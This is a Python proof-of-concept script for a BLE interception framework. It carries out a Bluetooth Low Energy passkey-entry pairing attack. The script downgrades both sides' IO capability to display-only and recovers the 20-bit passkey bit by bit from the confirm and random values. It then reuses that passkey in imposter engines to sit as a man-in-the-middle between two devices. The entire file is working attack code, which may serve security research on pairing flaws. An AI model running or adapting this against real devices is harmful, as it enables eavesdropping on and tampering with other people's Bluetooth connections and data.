import os
import sys
import asyncio

DEMO_PATH = os.path.dirname(os.path.abspath(__file__))
ROOT_PATH = os.path.join(DEMO_PATH, "..")
sys.path.append(ROOT_PATH)

from ble_lancet import lancet_main
from ble_lancet.crypto import f4
from ble_lancet.utils import Frag
from ble_lancet.vsm import BT_ROLE, BT_IOCAP
from ble_lancet.interface import InterfaceRecordFile
from ble_lancet.engine import ImposterEngine, RuleEngine
from ble_lancet.lancet import Lancet, LancetItfID, LancetLayer, LancetMode
from ble_lancet.packet import (
    Packet,
    BTLE_WITH_CTE,
    SM_Pairing_Request,
    SM_Pairing_Response,
    SM_Confirm,
    SM_Random,
    SM_Public_Key,
    SM_Failed,
)

step1_finished = False

local_pk = None
local_frag = Frag()

remote_pk = None
remote_frag = Frag()

ci = b""
passkey = 0
passkey_pos = 0


@lancet_main
async def main():
    # create the lancet client, modify the LLL layer packets
    lancet = Lancet(LancetLayer.HLL, LancetMode.Manipulate)

    # create the interface record file
    rfile = InterfaceRecordFile("pcap", "link", "pe_confusion_t2.pcap")

    # let the interfaces record the modified packet into the file
    lancet.interfaces[LancetItfID.Lancet2Local].enable_record(rfile)
    lancet.interfaces[LancetItfID.Lancet2Remote].enable_record(rfile)

    local_rule_engine = RuleEngine()
    remote_rule_engine = RuleEngine()

    def rule_display_only(pkt: Packet):
        if SM_Pairing_Request in pkt:
            pkt[SM_Pairing_Request].iocap = BT_IOCAP.DISPLAY_ONLY
            print("Set Paring Request IO Capability to DISPLAY_ONLY")
        if SM_Pairing_Response in pkt:
            pkt[SM_Pairing_Response].iocap = BT_IOCAP.DISPLAY_ONLY
            print("Set Paring Response IO Capability to DISPLAY_ONLY")
        return pkt

    local_rule_engine.add_rule(rule_display_only)
    remote_rule_engine.add_rule(rule_display_only)

    # First Step: manage to get the passkey
    def rule_get_local_pk(pkt: Packet):
        global local_pk, step1_finished
        if step1_finished:
            return pkt

        if local_pk is not None:
            return pkt

        assert pkt.haslayer(BTLE_WITH_CTE)
        ressembled_pkt = local_frag.ressemble(pkt[BTLE_WITH_CTE])
        if ressembled_pkt is None:
            return pkt

        if SM_Public_Key in ressembled_pkt:
            local_pk = ressembled_pkt[SM_Public_Key].key_x[::-1]
            print(f"Local PK: {local_pk.hex()}")
        return pkt

    def rule_get_remote_pk(pkt: Packet):
        global remote_pk, step1_finished
        if step1_finished:
            return pkt

        if remote_pk is not None:
            return pkt

        assert pkt.haslayer(BTLE_WITH_CTE)
        ressembled_pkt = remote_frag.ressemble(pkt[BTLE_WITH_CTE])
        if ressembled_pkt is None:
            return pkt

        if SM_Public_Key in ressembled_pkt:
            remote_pk = ressembled_pkt[SM_Public_Key].key_x[::-1]
        return pkt

    def rule_set_ci(pkt: Packet):
        global ci, step1_finished
        if step1_finished:
            return pkt

        if SM_Confirm in pkt:
            ci = pkt[SM_Confirm].confirm[::-1]
        return pkt

    def rule_set_ni(pkt: Packet):
        global ci, remote_pk, local_pk, passkey, passkey_pos, step1_finished
        if step1_finished:
            return pkt

        if SM_Random in pkt:
            ni = pkt[SM_Random].random[::-1]
            confirm = f4(local_pk, remote_pk, ni, b"\x80")
            if ci == confirm:
                ri = 0
            else:
                ri = 1
            passkey = passkey | (ri << passkey_pos)
            passkey_pos += 1

            print(f"Round[{passkey_pos}]: {ri}")

            if passkey_pos == 20:
                print(f"Passkey: {passkey}")

        return pkt
    
    def rule_finish(pkt: Packet):
        global step1_finished
        if SM_Failed in pkt:
            step1_finished = True
            print("Step 1 finished")
        return pkt

    local_rule_engine.add_rule(rule_get_local_pk)
    local_rule_engine.add_rule(rule_set_ci)
    local_rule_engine.add_rule(rule_set_ni)
    local_rule_engine.add_rule(rule_finish)

    remote_rule_engine.add_rule(rule_get_remote_pk)
    remote_rule_engine.add_rule(rule_finish)


    # Second Step: use the same passkey to become the man-in-the-middle

    responder_engine = ImposterEngine(BT_IOCAP.DISPLAY_ONLY, BT_ROLE.RESPONDER)
    initiator_engine = ImposterEngine(BT_IOCAP.DISPLAY_ONLY, BT_ROLE.INITIATOR)

    responder_engine.vsm.set_passkey_cb(lambda: passkey)
    initiator_engine.vsm.set_passkey_cb(lambda: passkey)

    async def rule(pkt):
        if pkt is None:
            print("pkt is none")
            return pkt

        if SM_Pairing_Request in pkt:
            assert lancet.local_addr is not None
            assert lancet.remote_addr is not None
            print("Responder: Pairing request received")

            initiator_engine.vsm.set_address(lancet.remote_addr, lancet.local_addr)
            responder_engine.vsm.set_address(lancet.local_addr, lancet.remote_addr)

            await initiator_engine.send_pair_request(pkt)
            print("Initiator: Pairing request sent")
        return pkt

    rule_engine = RuleEngine()
    rule_engine.add_rule(rule)

    rule_engine.standby = True
    initiator_engine.standby = True
    responder_engine.standby = True

    lancet.set_engine_link(
        LancetItfID.Local2Lancet, LancetItfID.Lancet2Remote, 
        local_rule_engine,
        initiator_engine,

    )
    lancet.set_engine_link(
        LancetItfID.Remote2Lancet, LancetItfID.Lancet2Local, 
        remote_rule_engine,
        rule_engine,
        responder_engine,
    )


    # wait for the first step to finish
    async def wait_for_step1():
        while not step1_finished:
            await asyncio.sleep(0.01)
        local_rule_engine.standby = True
        remote_rule_engine.standby = True

        rule_engine.standby = False
        initiator_engine.standby = False
        responder_engine.standby = False

    lancet.add_task(wait_for_step1)
    await lancet.start_and_wait()


main()
